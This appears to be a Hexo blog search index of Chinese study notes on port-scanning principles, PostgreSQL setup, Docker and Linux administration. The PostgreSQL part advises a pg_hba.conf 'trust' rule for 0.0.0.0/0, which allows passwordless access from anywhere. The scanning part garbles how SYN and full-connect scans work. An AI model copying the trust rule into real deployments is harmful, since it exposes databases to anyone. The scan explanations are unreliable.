<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSM产品原理</title>
    <url>/2023/10/07/CSM%E4%BA%A7%E5%93%81%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h3 id="极速模式和标准模式的区别"><a href="#极速模式和标准模式的区别" class="headerlink" title="极速模式和标准模式的区别"></a>极速模式和标准模式的区别</h3><p>极速模式：使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接）<br>标准模式：使用TCP进行扫描（默认nmap扫描方式，三次握手）</p>
<h3 id="TCP端口扫描可以分为两类-全连接扫描、半连接扫描"><a href="#TCP端口扫描可以分为两类-全连接扫描、半连接扫描" class="headerlink" title="TCP端口扫描可以分为两类:全连接扫描、半连接扫描"></a>TCP端口扫描可以分为两类:全连接扫描、半连接扫描</h3><h4 id="全连接扫描"><a href="#全连接扫描" class="headerlink" title="全连接扫描"></a>全连接扫描</h4><p>原理:扫描者向目标主机发送一个SYN+SYN&#x2F;ACK数据包，目标主机会回复一个ACK数据包。无法利用scapy模块进行全连接扫描，因为如果同时向目标主机发送一个SYN+SYN&#x2F;ACK数据包，目标主机会认为这是一个错误的数据包，会直接回复一个RST。如果向目标主机发送一个SYN数据包，目标主机会回复一个SYN&#x2F;ACK数据包，但是此时并没有再向目标主机发送ACK数据包，因此，全连接无法建立。(但是可以使用nmap中的-sT参数来进行全连接扫描)<br>优点:探测结果准确<br>缺点:会被目标主机的日志记录</p>
<h4 id="半连接扫描-也称为隐蔽扫描"><a href="#半连接扫描-也称为隐蔽扫描" class="headerlink" title="半连接扫描(也称为隐蔽扫描)"></a>半连接扫描(也称为隐蔽扫描)</h4><p>原理:扫描者向目标主机发送一个SYN，如果目标主机回复了一个SYN&#x2F;ACK数据包，那么说明主机存活，如果收到一个RST&#x2F;ACK数据包，那么主机没有存活。因为扫描者只向目标主机发送了SYN，并没有和目标主机进行连接，因此称为半连接。<br>优点:不会在目标主机的日志上有所记录<br>缺点:扫描结果不是很准确</p>
]]></content>
      <tags>
        <tag>产品</tag>
      </tags>
  </entry>
  <entry>
    <title>Postgresql安装使用与配置数据库访问权限</title>
    <url>/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/</url>
    <content><![CDATA[<h3 id="Centos7安装PostgreSQL12记录"><a href="#Centos7安装PostgreSQL12记录" class="headerlink" title="Centos7安装PostgreSQL12记录"></a>Centos7安装PostgreSQL12记录</h3><blockquote>
<p>参考链接：[Centos 7 安装 PostgreSQL 12<a href="https://blog.csdn.net/Loongtext/article/details/108523426">step-by-step]-CSDN博客</a></p>
</blockquote>
<ol>
<li>将PostgreSQL Yum存储库添加到CentOS 7</li>
</ol>
<blockquote>
<p>sudo yum -y install <a href="https://download.postgresql.org/pub/repos/yum/reporpms/EL-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm">https://download.postgresql.org/pub/repos/yum/reporpms/EL-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm</a></p>
</blockquote>
<ol start="2">
<li>在CentOS 8 &#x2F; CentOS 7上安装PostgreSQL 12</li>
</ol>
<p>  添加YUM存储库后，我们可以使用以下命令在CentOS 7&#x2F;8上安装PostgreSQL 12。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum -y install epel-release yum-utils</span><br><span class="line">sudo yum-config-manager --<span class="built_in">enable</span> pgdg12</span><br><span class="line">sudo yum install postgresql12-server postgresql12</span><br></pre></td></tr></table></figure>

<p>数据库的主要配置文件是：&#x2F;var&#x2F;lib&#x2F;pgsql&#x2F;12&#x2F;data&#x2F;postgresql.conf</p>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下面这三行好像是不需要执行的。。。先忽略这三行。。。</span></span><br><span class="line"><span class="comment">#sudo yum clean all</span></span><br><span class="line"><span class="comment">#sudo yum makecache fast</span></span><br><span class="line"><span class="comment">#sudo yum -y install postgresql12-server postgresql12</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>初始化并启动数据库服务<br>安装后，需要先进行数据库初始化，然后才能启动服务。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/pgsql-12/bin/postgresql-12-setup initdb</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> --now postgresql-12</span><br><span class="line">systemctl status postgresql-12</span><br></pre></td></tr></table></figure></li>
</ol>
<p>如果您有正在运行的防火墙服务，并且远程客户端应连接到数据库服务器，则允许PostgreSQL服务。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo firewall-cmd --add-service=postgresql --permanent</span><br><span class="line">sudo firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>设置密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo su - postgres </span><br><span class="line">-bash-4.2$ psql -c <span class="string">&quot;alter user postgres with password &#x27;StrongPassword&#x27;&quot;</span> </span><br><span class="line">ALTER ROLE</span><br></pre></td></tr></table></figure></li>
</ol>
<p>默认root并不能连接，需要切换为用户postgres</p>
<img data-src="/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/image-20231101114412649.png" class title="image-20231101114412649">

<h3 id="配置数据库访问权限"><a href="#配置数据库访问权限" class="headerlink" title="配置数据库访问权限"></a>配置数据库访问权限</h3><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><ol>
<li>pg_hba.conf 配置PostgreSQL数据库的访问权限。<br>找到“# IPv4 local connections:“后，回车另起一行，添加参数行如下，保存。</li>
</ol>
<p>host all all 0.0.0.0&#x2F;0 trust<br>其中0.0.0.0&#x2F;0表示运行任意ip地址访问</p>
<img data-src="/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NpcnR1c1NvZGE=,size_16,color_FFFFFF,t_70.png" class title="在这里插入图片描述">


<ol start="2">
<li>postgresql.conf 配置PostgreSQL数据库服务器的相应的参数。<br>找到“listen_addresses“参数后，设置listen_addresses &#x3D; ‘*’，保存。</li>
</ol>
<img data-src="/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NpcnR1c1NvZGE=,size_16,color_FFFFFF,t_70-16989091069542.png" class title="在这里插入图片描述">


<ol start="3">
<li><p>设置好后重启服务即可被远程连接</p>
</li>
<li><p>可用pgadmin4进行测试连接,或者在cmd里远程访问linux的postgresql：</p>
</li>
</ol>
<p>第一种方式：</p>
<img data-src="/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/image-20231102160330396.png" class title="image-20231102160330396">

<p>第二种方式：</p>
<img data-src="/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/image-20231102162022207.png" class title="image-20231102162022207">

<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>\1. 打开postgresql安装目录的data子目录<br>\2. 修改pg_hba.conf文件：在IPV4部分添加新的一行:host all all 0.0.0.0&#x2F;0 md5<br>\3. 控制面板–&gt;系统与安全–&gt;Windows防火墙<br>\4. 点击左侧“高级设置”功能<br>\5. 选择左侧树上“入站规则”，再点击右侧操作树上的“新建规则”<br>\6. 在弹出的向导对话框中选择”端口”，然后点击“下一步”<br>\7. 在特定本地端口的输入框里输入”5432”,然后一直“下一步”到最后一页，随便给规则起个名字如“postgresql rule”。<br>\8. 用其他电脑的数据库客户端（如pgAdmin或者psql）连接该Windows版postgresql数据库服务器。</p>
<p>第一种方式：</p>
<img data-src="/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/image-20231102161816956.png" class title="image-20231102161816956">

<p>第二种方式：</p>
<img data-src="/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/image-20231102162228737.png" class title="image-20231102162228737">

<h3 id="几个简单命令"><a href="#几个简单命令" class="headerlink" title="几个简单命令"></a>几个简单命令</h3><p>(1)列出所有的数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql: <span class="keyword">show</span> databases</span><br><span class="line">psql: \l或\list</span><br></pre></td></tr></table></figure>

<p>(2)切换数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql: use dbname</span><br><span class="line">psql: \c dbname</span><br></pre></td></tr></table></figure>

<p>(3)列出当前数据库下的数据表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql: <span class="keyword">show</span> tables</span><br><span class="line">psql: \d</span><br></pre></td></tr></table></figure>

<p>(4)列出指定表的所有字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql: <span class="keyword">show</span> columns <span class="keyword">from</span> <span class="keyword">table</span> name</span><br><span class="line">psql: \d tablename</span><br></pre></td></tr></table></figure>

<p>(5)查看指定表的基本情况</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql: <span class="keyword">describe</span> tablename</span><br><span class="line">psql: \d<span class="operator">+</span> tablename</span><br></pre></td></tr></table></figure>

<p>(6)查看所有用户</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql：<span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> mysql.user</span><br><span class="line">psql:\du</span><br></pre></td></tr></table></figure>

<p>(7)退出登录</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql: quit 或者\q</span><br><span class="line">psql:\q</span><br></pre></td></tr></table></figure>

<p>(8)查看pgsl版本</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#psql登陆</span><br><span class="line"><span class="keyword">show</span> server_version;</span><br><span class="line">#或者</span><br><span class="line"><span class="keyword">SELECT</span> version();</span><br></pre></td></tr></table></figure>

<p>(9)命令行登陆数据库</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">psql postgres://username:password@host:port/dbname</span><br><span class="line">psql -U username -h hostname -p port -d dbname</span><br></pre></td></tr></table></figure>

<img data-src="/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/image-20231102160133712.png" class title="image-20231102160133712">

<img data-src="/2023/11/01/Postgresql%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/image-20231102160108349.png" class title="image-20231102160108349">

<p>(10)修改密码</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#psql登陆</span><br><span class="line">\password postgres</span><br></pre></td></tr></table></figure>

<p>(11)Pgsql数据库常用Sql语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id,name,start_time,zone_name,scanids,<span class="keyword">value</span> <span class="keyword">from</span> vrp_task <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> limit <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> COMPANY (ID,NAME,AGE,ADDRESS,SALARY,JOIN_DATE) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;Paul&#x27;</span>, <span class="number">32</span>, <span class="string">&#x27;California&#x27;</span>, <span class="number">20000.00</span>,<span class="string">&#x27;2001-07-13&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> vrp_task <span class="keyword">set</span> scanids<span class="operator">=</span><span class="string">&#x27;2540&#x27;</span> <span class="keyword">where</span> id <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> vrp_port <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>学习计划</tag>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker及docker-compose</title>
    <url>/2023/10/19/Docker%E5%8F%8Adocker-compose/</url>
    <content><![CDATA[<h3 id="centos下安装docker及docker-compose"><a href="#centos下安装docker及docker-compose" class="headerlink" title="centos下安装docker及docker-compose"></a>centos下安装docker及docker-compose</h3><p><a href="https://www.cnblogs.com/mlzheng/p/16010772.html#_label0_2">Centos7下安装Docker详细教程 - mlzheng - 博客园 (cnblogs.com)</a></p>
<p><a href="https://juejin.cn/post/7210944562222383160#heading-22">CentOS 安装docker &amp; docker-compose - 掘金 (juejin.cn)</a></p>
<h3 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h3><ul>
<li>设置开机启动docker服务</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<ul>
<li>列出当前的网络</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~<span class="comment"># docker network ls</span></span><br><span class="line"></span><br><span class="line">runoob@runoob:~<span class="comment"># docker network inspect bridge | less</span></span><br></pre></td></tr></table></figure>

<ul>
<li>运行一个web应用</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~<span class="comment"># docker pull training/webapp  # 载入镜像</span></span><br><span class="line">runoob@runoob:~<span class="comment"># docker run -d -P training/webapp python app.py</span></span><br><span class="line"><span class="comment">#-P：将容器内部使用的网络端口随机映射到我们使用的主机上。</span></span><br></pre></td></tr></table></figure>

<ul>
<li>网络端口映射</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker run -d -p 5000:5000 training/webapp python app.py</span><br><span class="line"><span class="comment">#我们可以指定容器绑定的网络地址，比如绑定 127.0.0.1。</span></span><br><span class="line">runoob@runoob:~$ docker run -d -p 127.0.0.1:5001:5000 training/webapp python app.py</span><br><span class="line"><span class="comment">#如果要绑定 UDP 端口，可以在端口后面加上 /udp。</span></span><br><span class="line">runoob@runoob:~$ docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py</span><br></pre></td></tr></table></figure>

<ul>
<li>查看容器的端口映射</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~<span class="comment"># docker port bf08b7f2cd89 （+端口）</span></span><br></pre></td></tr></table></figure>

<ul>
<li>查看 WEB 应用程序日志</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker logs -f bf08b7f2cd89</span><br></pre></td></tr></table></figure>

<ul>
<li>查看WEB应用程序容器的进程</li>
</ul>
<p>查看容器内部运行的进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker top wizardly_chandrasekhar</span><br></pre></td></tr></table></figure>

<ul>
<li>检查 WEB 应用程序</li>
</ul>
<p>使用 <strong>docker inspect</strong> 来查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker inspect wizardly_chandrasekhar</span><br></pre></td></tr></table></figure>

<ul>
<li>停止 WEB 应用容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker stop wizardly_chandrasekhar   </span><br></pre></td></tr></table></figure>

<ul>
<li>docker ps -l 查询最后一次创建的容器：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker ps -l </span><br></pre></td></tr></table></figure>

<ul>
<li>移除WEB应用容器</li>
</ul>
<p>我们可以使用 docker rm 命令来删除不需要的容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker <span class="built_in">rm</span> wizardly_chandrasekhar  </span><br></pre></td></tr></table></figure>

<p>删除容器时，容器必须是停止状态，否则会报如下错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker <span class="built_in">rm</span> wizardly_chandrasekhar</span><br></pre></td></tr></table></figure>

<ul>
<li>进入容器</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~$ docker run -t -i ubuntu:15.10 /bin/bash </span><br><span class="line">root@d77ccb2e5cca:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="能够docker加速"><a href="#能够docker加速" class="headerlink" title="能够docker加速"></a>能够docker加速</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><blockquote>
<p>阿里云镜像加速</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://01sy6s7g.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p>创建或者修改 &#x2F;ect&#x2F;docker&#x2F;daemon.json文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~<span class="comment"># vim /etc/docker/daemon.json</span></span><br></pre></td></tr></table></figure>

<p>添加或者修改如下内容</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;&lt;https://registry.docker-cn.com&gt;&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>重启docker服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">runoob@runoob:~<span class="comment"># systemctl restart docker</span></span><br></pre></td></tr></table></figure>

<p>查看源配置是否成功</p>
<p>执行<code>docker info</code></p>
<p>查看字段：Registry Mirrors</p>
<h3 id="熟悉Dockerfile的语法、编写和镜像构建"><a href="#熟悉Dockerfile的语法、编写和镜像构建" class="headerlink" title="熟悉Dockerfile的语法、编写和镜像构建"></a>熟悉Dockerfile的语法、编写和镜像构建</h3><p><a href="http://www.dockerinfo.net/dockerfile%E4%BB%8B%E7%BB%8D">Docker中文文档 Dockerfile介绍-DockerInfo</a></p>
<h3 id="熟悉docker-compose-yml文件语法、编写和微服务构建"><a href="#熟悉docker-compose-yml文件语法、编写和微服务构建" class="headerlink" title="熟悉docker-compose.yml文件语法、编写和微服务构建"></a>熟悉docker-compose.yml文件语法、编写和微服务构建</h3><p><a href="https://www.runoob.com/docker/docker-compose.html">Docker Compose | 菜鸟教程 (runoob.com)</a></p>
<p><a href="https://blog.csdn.net/crazymakercircle/article/details/121134684">Docker-Compose入门到精通 （图解+秒懂+史上最全）_docker-compose图-CSDN博客</a></p>
<h3 id="卸载docker、能对docker工作目录迁移"><a href="#卸载docker、能对docker工作目录迁移" class="headerlink" title="卸载docker、能对docker工作目录迁移"></a>卸载docker、能对docker工作目录迁移</h3><p><a href="https://blog.csdn.net/gaodaojiang2015/article/details/115251029">linux centos7 安装 docker 和迁移数据目录_centos7迁移docker-CSDN博客</a></p>
<p><a href="https://cubesec.yuque.com/ybgdo8/snryyh/vbr2g2">docker 目录迁移 (yuque.com)</a></p>
<h3 id="docker-compose常用命令"><a href="#docker-compose常用命令" class="headerlink" title="docker-compose常用命令"></a>docker-compose常用命令</h3><p>(必须在有docker-compose.yml文件的目录下执行)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">docker-compose up -d； docker-compose up -d pgsql_server 启动yml文件所有容器/某个容器</span><br><span class="line"></span><br><span class="line">docker-compose down -v  停止并删除运行中的容器以及已创建的所有网络。其中，-v 参数表示删除所有</span><br><span class="line"></span><br><span class="line">docker-compose logs -f -tail <span class="number">100</span>   查看日志</span><br><span class="line"></span><br><span class="line">docker-compose ps -a 查看所有容器</span><br><span class="line"></span><br><span class="line">docker-compose restart/<span class="built_in">pause</span>/unpause csm 重新/暂停/取消暂停启动停止服务的容器</span><br><span class="line"></span><br><span class="line">docker-compose top 查看各个服务容器内运行的进程</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>学习计划</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux操作系统</title>
    <url>/2023/10/07/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h3 id="物理机安装linux"><a href="#物理机安装linux" class="headerlink" title="物理机安装linux"></a>物理机安装linux</h3><p><a href="https://blog.csdn.net/qq_41606722/article/details/118915734">电脑直接安装Linux系统（物理机安装Linux系统）_电脑可以直接装linux系统吗-CSDN博客</a></p>
<h3 id="重置Linux-root密码"><a href="#重置Linux-root密码" class="headerlink" title="重置Linux root密码"></a>重置Linux root密码</h3><ol>
<li>没有忘记密码：passwd root</li>
<li>忘记密码：(亲测适用于centos7.9)</li>
</ol>
<p><a href="https://blog.csdn.net/wanghailan1818/article/details/121680029">Linux重置 root 管理员密码_linux怎么重置管理员密码_昙花逐月的博客-CSDN博客</a></p>
<h3 id="磁盘分区及挂载"><a href="#磁盘分区及挂载" class="headerlink" title="磁盘分区及挂载"></a>磁盘分区及挂载</h3><span id="more"></span>

<p><a href="https://blog.csdn.net/sinat_34104446/article/details/84637590">Linux-CentOS7添加磁盘、分区、格式分区、挂载-CSDN博客</a></p>
<p>挂载后执行mount -a后不用重启，直接lsblk -f&#x2F;df -h查看</p>
<h3 id="Linux网络配置"><a href="#Linux网络配置" class="headerlink" title="Linux网络配置"></a>Linux网络配置</h3><p>[Linux网络的网络配置（超详细，百分百成功）_linux配置网络_李南想做条咸鱼的博客-CSDN博客](<a href="https://blog.csdn.net/m0_53683186/article/details/114671198#:~:text=%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C">https://blog.csdn.net/m0_53683186/article/details/114671198#:~:text=配置Linux网络</a> 一、以非Root用户登录（养成个好习惯，不要什么都用Root用户，以后工作会吃大亏的）,二、记录下三个信息，用作配置IPADDR%2CNETMASK%2CGATEWAY 三、用su切换到root用户，然后修改网卡信息 四、测试网卡能不能联网)</p>
<h3 id="Linux网络问题排错"><a href="#Linux网络问题排错" class="headerlink" title="Linux网络问题排错"></a>Linux网络问题排错</h3><p><a href="https://www.cnblogs.com/yahuian/p/11407090.html">Linux网络问题排错 - YahuiAn - 博客园 (cnblogs.com)</a></p>
<p><strong>省流版</strong>：</p>
<ol>
<li><p><strong>检查链路层</strong>（网卡是否正常工作）：<code>ifconfig</code>或者<code>ip addr show</code>查看网卡信息, 假如我们关注的网卡名是ens33，然后我们使用 <code>ifdown ens33</code> 来关掉它，再使用 <code>ifup ens33</code> 来启动它（ens33是你的网卡名称），大多数情况下，重启网卡后网络就能正常访问。</p>
</li>
<li><p><strong>检查网络层</strong>（网卡是否配置正确）：<strong>IP地址</strong>，<strong>子网掩码</strong>，<strong>网关</strong> ，<strong>DNS服务器</strong>的配置参考[Linux网络的网络配置（超详细，百分百成功）_linux配置网络_李南想做条咸鱼的博客-CSDN博客](<a href="https://blog.csdn.net/m0_53683186/article/details/114671198#:~:text=%E9%85%8D%E7%BD%AELinux%E7%BD%91%E7%BB%9C">https://blog.csdn.net/m0_53683186/article/details/114671198#:~:text=配置Linux网络</a> 一、以非Root用户登录（养成个好习惯，不要什么都用Root用户，以后工作会吃大亏的）,二、记录下三个信息，用作配置IPADDR%2CNETMASK%2CGATEWAY 三、用su切换到root用户，然后修改网卡信息 四、测试网卡能不能联网)</p>
<p><strong>检验</strong>：</p>
</li>
</ol>
<ul>
<li><p>ping网关或者局域网内其他地址，如果正常工作，那么即可确认在局域网内我们是正常的。</p>
</li>
<li><p>其次，我们可以ping百度，如果正常工作，哪么说明在公网上我们也是正常的。</p>
</li>
</ul>
<ol start="3">
<li><p><strong>检查传输层</strong>：端口是否开放，我们所使用的协议和监听的端口不会被防火墙所阻挡</p>
</li>
<li><p><strong>检查应用层</strong>（服务是否正常工作）：这种情况一般很明显，比如大家常见的 <code>404 NOT FOUND</code> ，这种要么是被墙了，要么是服务端发生了错误。一般错误信息比较明显。</p>
</li>
</ol>
<h3 id="能够使用rpm和dpkg-等命令手动安装Linux软件"><a href="#能够使用rpm和dpkg-等命令手动安装Linux软件" class="headerlink" title="能够使用rpm和dpkg 等命令手动安装Linux软件"></a>能够使用rpm和dpkg 等命令手动安装Linux软件</h3><table>
<thead>
<tr>
<th>rpm</th>
<th>yum</th>
<th>dpkg</th>
<th>apt</th>
</tr>
</thead>
<tbody><tr>
<td>rpm -ivh pkgfile.rpm</td>
<td>yum install -y package</td>
<td>dpkg -i pkgfile.deb</td>
<td>apt-get install</td>
</tr>
</tbody></table>
<h3 id="能够解决包的依赖问题（pkgs-org）"><a href="#能够解决包的依赖问题（pkgs-org）" class="headerlink" title="能够解决包的依赖问题（pkgs.org）"></a>能够解决包的依赖问题（pkgs.org）</h3><p><a href="https://blog.csdn.net/m0_67610821/article/details/123409750">【pkgs.org】linux&#x2F;uinx依赖包源网站推荐+如何添加该网站到debian源_pkgs网-CSDN博客</a></p>
<h3 id="熟练使用yum和apt命令"><a href="#熟练使用yum和apt命令" class="headerlink" title="熟练使用yum和apt命令"></a>熟练使用yum和apt命令</h3><h4 id="yum"><a href="#yum" class="headerlink" title="yum"></a>yum</h4><p><font color="gray"> yum命令是在Fedora和RedHat以及SUSE中基于rpm的软件包管理器，它可以使系统管理人员交互和自动化地更新与管理RPM软件包，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。</font></p>
<p>部分常用的命令包括：</p>
<ul>
<li>自动搜索最快镜像插件：<code>yum install yum-fastestmirror</code></li>
<li>安装yum图形窗口插件：<code>yum install yumex</code></li>
<li>查看可能批量安装的列表：<code>yum grouplist</code></li>
</ul>
<p><strong>安装</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install              #全部安装</span><br><span class="line">yum install package1     #安装指定的安装包package1</span><br><span class="line">yum groupinsall group1   #安装程序组group1</span><br></pre></td></tr></table></figure>

<p><strong>更新和升级</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum update               #全部更新</span><br><span class="line">yum update package1      #更新指定程序包package1</span><br><span class="line">yum check-update         #检查可更新的程序</span><br><span class="line">yum upgrade package1     #升级指定程序包package1</span><br><span class="line">yum groupupdate group1   #升级程序组group1</span><br></pre></td></tr></table></figure>

<p><strong>查找和显示</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查 MySQL 是否已安装</span></span><br><span class="line">yum list installed | grep mysql</span><br><span class="line">yum list installed mysql*</span><br><span class="line"></span><br><span class="line">yum info package1      #显示安装包信息package1</span><br><span class="line">yum list               #显示所有已经安装和可以安装的程序包</span><br><span class="line">yum list package1      #显示指定程序包安装情况package1</span><br><span class="line">yum groupinfo group1   #显示程序组group1信息yum search string 根据关键字string查找安装包</span><br></pre></td></tr></table></figure>

<p><strong>删除程序</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum remove &amp;#124; erase package1   #删除程序包package1</span><br><span class="line">yum groupremove group1             #删除程序组group1</span><br><span class="line">yum deplist package1               #查看程序package1依赖情况</span><br></pre></td></tr></table></figure>

<p><strong>清除缓存</strong></p>
